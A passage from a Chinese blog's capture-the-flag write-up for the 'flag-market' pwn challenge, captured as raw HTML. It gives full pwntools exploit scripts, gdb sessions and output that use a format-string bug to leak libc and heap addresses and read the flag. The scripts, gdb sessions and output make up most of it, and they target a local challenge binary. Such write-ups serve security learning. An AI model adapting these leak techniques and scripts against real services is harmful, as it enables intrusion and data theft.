class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，运行之后可以看到（关键部分）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x2-(nil)-0x7ffd2c748851-0x1999999999999999-(nil)-0xc000-0x402b00000-0xffffffff00000010-0x27c212a0-0x2f0000000000c000-0x7f0067616c66-0x32-0x404050-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x7ffd2c748990-0x8988df52354d0500-0x7ffd2c748950-0x7e84d7c2a1ca-0x7ffd2c748900-0x7ffd2c7489d8-0x100400040-0x40139b-0x7ffd2c7489d8-0x9a34b258d05c60e2-0x1-(nil)-0x403e18-0x7e84d800c000-0x9a34b258d37c60e2-0x98c7453481fe60e2-0x7ffd00000000-(nil)-(nil)-0x1-0x7ffd2c7489d0-0x8988df52354d0500-0x7ffd2c7489b0-0x7e84d7c2a28b-0x7ffd2c7489e8-0x403e18-0x7ffd2c7489e8-0x40139b-welcome to flag market!</span><br></pre></td></tr></table></figure>
+
+<p>很明显，这连续的<code>(nil)</code>就是<code>my_memset(&amp;v15, 0LL, 64LL);</code>的杰作。</p>
+<p>因此，我们可以推断，第14个位置就是<code>[rbp-50h]</code></p>
+<p>那么，我们可以通过和<code>read</code>输入的配合，实现：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023214316077-107934784.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023214316077-107934784.png" alt="img"></a></p>
+<p>本阶段Poc:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>p64(0x404050)</code>是read@got的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt:0000000000404050 off_404050      dq offset sub_4010A0    ; DATA XREF: my_read+4↑r</span><br></pre></td></tr></table></figure>
+
+<p><code>0x11ba80</code>，这个偏移量，是<code>read</code>在libc.so.6中的偏移量，为什么选择这个？</p>
+<p>在上述Poc的输出中，会输出泄露的<code>read</code>的真实地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] read_addr:0x78a9a251ba80</span><br></pre></td></tr></table></figure>
+
+<p>拿这个地址去<a target="_blank" rel="noopener" href="https://libc.blukat.me/">网站</a>上搜索一下</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215019295-212912469.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023215019295-212912469.png" alt="image"></a></p>
+<p>接着问AI：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215116586-1271645686.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023215116586-1271645686.png" alt="image"></a></p>
+<p>然后在网站上点击该库文件即可看到偏移量：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215157409-635275790.png"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/flag-market/3622178-20251023215157409-635275790.png" alt="image"></a></p>
+<h3 id="2、找指向缓冲区的指针"><a href="#2、找指向缓冲区的指针" class="headerlink" title="2、找指向缓冲区的指针"></a>2、找指向缓冲区的指针</h3><p>我们通过gdb的find命令，就可以很容易找到在libc中指向缓冲区的指针</p>
+<p>为了程序的顺利执行，我们需要在我们的虚拟器的根目录下创建一个flag文件。原因很简单，我们之前分析过，程序会打开根目录下的flag文件，如果没有找到，就会报错。</p>
+<p>我这已经准备好了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(pwn-env) zyf@zhengyifeng:/mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin$ <span class="built_in">cat</span> /flag</span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gdb打开程序，将断点设置在<code>0x4015B3</code></p>
+<blockquote>
+<p>断点没硬性要求，但是需要在建立缓冲区之后，即<code>fgets</code>之后。</p>
+</blockquote>
+<p>通过<code>got</code>命令找到read的真实地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin/chall:</span><br><span class="line">GOT protection: Partial RELRO | Found 17 GOT entries passing the filter</span><br><span class="line">[0x404018] putchar@GLIBC_2.2.5 -&gt; 0x7ffff7c89ce0 (putchar) ◂— endbr64</span><br><span class="line">[0x404020] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c87be0 (puts) ◂— endbr64</span><br><span class="line">[0x404028] write@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] fclose@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line">[0x404038] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401070 ◂— endbr64</span><br><span class="line">[0x404040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401080 ◂— endbr64</span><br><span class="line">[0x404048] memset@GLIBC_2.2.5 -&gt; 0x7ffff7d89440 (__memset_avx2_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x404050] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d1ba80 (<span class="built_in">read</span>) ◂— endbr64</span><br><span class="line">[0x404058] fgets@GLIBC_2.2.5 -&gt; 0x7ffff7c85b30 (fgets) ◂— endbr64</span><br><span class="line">[0x404060] getchar@GLIBC_2.2.5 -&gt; 0x4010c0 ◂— endbr64</span><br><span class="line">[0x404068] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7c88550 (setvbuf) ◂— endbr64</span><br><span class="line">[0x404070] open@GLIBC_2.2.5 -&gt; 0x4010e0 ◂— endbr64</span><br><span class="line">[0x404078] fopen@GLIBC_2.2.5 -&gt; 0x7ffff7c85e60 (fopen64) ◂— endbr64</span><br><span class="line">[0x404080] atoi@GLIBC_2.2.5 -&gt; 0x7ffff7c46660 (atoi) ◂— endbr64</span><br><span class="line">[0x404088] __isoc99_scanf@GLIBC_2.7 -&gt; 0x401110 ◂— endbr64</span><br><span class="line">[0x404090] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x401120 ◂— endbr64</span><br><span class="line">[0x404098] <span class="built_in">sleep</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d0ec50 (<span class="built_in">sleep</span>) ◂— endbr64</span><br></pre></td></tr></table></figure>
+
+<p>算出libc的基址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$libc_base</span> =  0x7ffff7d1ba80 - 0x11ba80</span><br><span class="line"><span class="variable">$1</span> = 0x7ffff7c00000</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们可以先在堆上找到flag的准确位置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405470</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x406480</span><br><span class="line">Size: 0x1fb80 (with flag bits: 0x1fb81)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x405000 0x500</span><br><span class="line">00:0000│      0x405000 ◂— 0</span><br><span class="line">01:0008│      0x405008 ◂— 0x291</span><br><span class="line">02:0010│      0x405010 ◂— 0</span><br><span class="line">... ↓         80 skipped</span><br><span class="line">53:0298│      0x405298 ◂— 0x1e1</span><br><span class="line">54:02a0│      0x4052a0 ◂— 0xfbad2488</span><br><span class="line">55:02a8│      0x4052a8 —▸ 0x4054ab ◂— 0</span><br><span class="line">56:02b0│      0x4052b0 —▸ 0x4054ab ◂— 0</span><br><span class="line">57:02b8│      0x4052b8 —▸ 0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">... ↓         4 skipped</span><br><span class="line">5c:02e0│      0x4052e0 —▸ 0x406480 ◂— 0</span><br><span class="line">5d:02e8│      0x4052e8 ◂— 0</span><br><span class="line">... ↓         3 skipped</span><br><span class="line">61:0308│      0x405308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">62:0310│      0x405310 ◂— 3</span><br><span class="line">63:0318│      0x405318 ◂— 0</span><br><span class="line">64:0320│      0x405320 ◂— 0</span><br><span class="line">65:0328│      0x405328 —▸ 0x405380 ◂— 0</span><br><span class="line">66:0330│      0x405330 ◂— 0xffffffffffffffff</span><br><span class="line">67:0338│      0x405338 ◂— 0</span><br><span class="line">68:0340│      0x405340 —▸ 0x405390 ◂— 0</span><br><span class="line">69:0348│      0x405348 ◂— 0</span><br><span class="line">... ↓         2 skipped</span><br><span class="line">6c:0360│      0x405360 ◂— 0xffffffff</span><br><span class="line">6d:0368│      0x405368 ◂— 0</span><br><span class="line">6e:0370│      0x405370 ◂— 0</span><br><span class="line">6f:0378│      0x405378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 0</span><br><span class="line">70:0380│      0x405380 ◂— 0</span><br><span class="line">... ↓         29 skipped</span><br><span class="line">8e:0470│      0x405470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0</span><br><span class="line">8f:0478│      0x405478 ◂— 0x1011</span><br><span class="line">90:0480│      0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">91:0488│      0x405488 ◂— <span class="string">&#x27;285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">92:0490│      0x405490 ◂— <span class="string">&#x27;b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">93:0498│      0x405498 ◂— <span class="string">&#x27;820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">94:04a0│      0x4054a0 ◂— <span class="string">&#x27;5a639bc1e&#125;\n&#x27;</span></span><br><span class="line">95:04a8│ r8-3 0x4054a8 ◂— 0xa7d65 /* <span class="string">&#x27;e&#125;\n&#x27;</span> */</span><br><span class="line">96:04b0│      0x4054b0 ◂— 0</span><br><span class="line">... ↓         506 skipped</span><br><span class="line">291:1488│      0x406488 ◂— 0x1fb81</span><br><span class="line">292:1490│      0x406490 ◂— 0</span><br><span class="line">... ↓         621 skipped</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明显，最低在<code>0x4052b8</code>就出现了。</p>
+<p>现在，我们就可以通过<code>find</code>命令找到那个指针了：</p>
+<blockquote>
+<p>注意，不要直接找flag所在的位置，要找flag所在的那个chunk的位置，因为指针指向的是chunk的位置而不是flag的位置。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; find /g <span class="variable">$libc_base</span>,<span class="variable">$libc_base</span>+0x400000,0x405000</span><br><span class="line">0x7ffff7e031e0 &lt;mp_+96&gt;</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x7ffff7e0ed68, halting search.</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure>
+
+<p>找到的<code>0x7ffff7e031e0 &lt;mp_+96&gt;</code>是在libc中的，而且我们已经泄露了libc的地址。那么，我们就可以通过格式化字符串漏洞的任意地址读泄露<code>0x7ffff7e031e0</code>中的内容即堆指针。但是，此时泄露出来的信息是chunk的地址，因此，为了准确定位flag，我们还得知道偏移量即<code>0x480</code></p>
+<h3 id="3、最终Poc"><a href="#3、最终Poc" class="headerlink" title="3、最终Poc"></a>3、最终Poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base+<span class="number">0x2031e0</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr:&quot;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_addr+<span class="number">0x480</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，我们在动态调试中找到的那个指针：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x7ffff7e031e0</span><br><span class="line">00:0000│     0x7ffff7e031e0 (mp_+96) —▸ 0x405000 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>在小端序中，其最低地址字节是”\x00”，这就会导致我们构造的格式化字符串”%s”直接戛然而止。</p>
+<p>因此，我们可以通过”地址+1”的手段，来跳过该空字符，然后泄露地址完成之后，通过左移1字节（8位）的操作（对应脚本<code>&lt;&lt; 8</code>），实现最低有效位（<code>\x00</code>）的补回。</p>
+<p>最终Poc的执行效果（关键部分）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x82 bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;#welcome to flag market!\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;give me money to buy my flag,\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;choice: \n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;1.take my money\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;2.exit\n&#x27;</span></span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br><span class="line"><span class="comment">#welcome to flag market!</span></span><br><span class="line">give me money to buy my flag,</span><br><span class="line">choice:</span><br><span class="line">1.take my money</span><br><span class="line">2.<span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到flag被我们泄露出来了~</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io">youdiscovered1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io/2025/10/25/flag-market/">https://beini-faxianl.github.io/2025/10/25/flag-market/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://beini-faxianl.github.io" target="_blank">A Secret Site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/fmt%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">fmt格式化字符串漏洞</a><a class="post-meta__tags" href="/tags/%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%8F%96/">任意地址读取</a><a class="post-meta__tags" href="/tags/%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/">泄露libc基址</a><a class="post-meta__tags" href="/tags/IO-FILE/">IO_FILE</a><a class="post-meta__tags" href="/tags/%E5%A0%86/">堆</a></div><div class="post-share"><div class="social-share" data-image="/img/cover.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/1.png" target="_blank"><img class="post-qr-code-img" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/1.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/2.png" target="_blank"><img class="post-qr-code-img" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/2.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.png'" alt="avatar"/></div><div class="author-info-name">youdiscovered1t</div><div class="author-info-description">不以物喜，不以己悲。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/beini-faxianl"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/beini-faxianl" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2301_76794844?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://www.cnblogs.com/youdiscovered1t" target="_blank" title="博客园"><i class="fa fa-pen-nib"></i></a><a class="social-icon" href="/1436319009@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BPWN-flag-market"><span class="toc-text">第九届强网杯线上赛PWN_flag-market</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE"><span class="toc-text">一、题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">二、信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E6%B1%87%E7%BC%96%E6%96%87%E4%BB%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90"><span class="toc-text">三、反汇编文件开始分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91"><span class="toc-text">1、分析程序基本逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">2、格式化字符串漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%80%9D%E8%B7%AF"><span class="toc-text">3、思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Poc%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-text">四、Poc的构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="toc-text">1、泄露libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%89%BE%E6%8C%87%E5%90%91%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E6%8C%87%E9%92%88"><span class="toc-text">2、找指向缓冲区的指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%9C%80%E7%BB%88Poc"><span class="toc-text">3、最终Poc</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/25/flag-market/" title="第九届强网杯线上赛Pwn_flag-market"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第九届强网杯线上赛Pwn_flag-market"/></a><div class="content"><a class="title" href="/2025/10/25/flag-market/" title="第九届强网杯线上赛Pwn_flag-market">第九届强网杯线上赛Pwn_flag-market</a><time datetime="2025-10-25T13:05:00.000Z" title="发表于 2025-10-25 21:05:00">2025-10-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By youdiscovered1t</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
